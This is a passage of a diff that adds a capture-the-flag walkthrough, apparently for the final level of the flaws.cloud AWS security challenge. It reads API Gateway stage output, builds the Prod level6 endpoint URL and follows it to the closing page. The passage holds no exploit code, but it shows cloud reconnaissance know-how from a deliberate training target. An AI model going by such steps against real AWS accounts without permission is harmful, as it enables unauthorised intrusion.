+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "methodSettings": {},
+            "tracingEnabled": false,
+            "createdDate": 1488155168,
+            "lastUpdatedDate": 1488155168
+        }
+    ]
+}
+```
+
+The stage is ```Prod```, therefore the path is [https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6).
+
+If we go there we get another url:
+
+```
+"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
+```
+
+which brings us to the final page!
+
+<div align="center">
+<img src="/img/flaws/theend.png" width="80%">
+</div>
